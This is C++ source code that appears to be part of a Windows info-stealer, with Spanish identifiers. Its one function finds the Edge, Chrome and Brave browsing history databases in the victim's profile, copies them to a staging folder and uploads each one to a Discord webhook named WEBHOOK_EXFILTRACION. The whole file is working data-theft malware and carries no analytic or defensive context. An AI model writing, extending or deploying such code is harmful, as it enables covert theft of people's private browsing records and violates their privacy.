#include "browser.h"
#include "discord.h"
#include "config.h"

#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>

#pragma comment(lib, "shell32.lib")

static bool CopiarArchivo(const std::wstring& origen, const std::wstring& destino) {
    return CopyFileW(origen.c_str(), destino.c_str(), FALSE) != 0;
}

static std::wstring CarpetaUsuario() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path)))
        return std::wstring(path);
    return L"";
}

void EnviarHistorialesNavegadores() {
    std::wstring user = CarpetaUsuario();
    if (user.empty()) return;

    std::vector<std::pair<std::wstring, std::wstring>> rutas = {
        { user + L"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History", L"Edge_History" },
        { user + L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", L"Chrome_History" },
        { user + L"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History", L"Brave_History" },
    };

    std::wstring tempDir = std::wstring(VAULT_PATH) + L"\\browsers";
    CreateDirectoryW(tempDir.c_str(), NULL);

    for (auto& pair : rutas) {
        const std::wstring& origen = pair.first;
        const std::wstring& nombre = pair.second;

        if (GetFileAttributesW(origen.c_str()) == INVALID_FILE_ATTRIBUTES)
            continue;

        std::wstring destino = tempDir + L"\\" + nombre + L".db";
        if (CopiarArchivo(origen, destino)) {
            std::wstring comentario = L"🌐 **Historial:** `" + nombre + L"`";
            DiscordEnviarArchivo(WEBHOOK_EXFILTRACION, destino, comentario);
        }
    }
}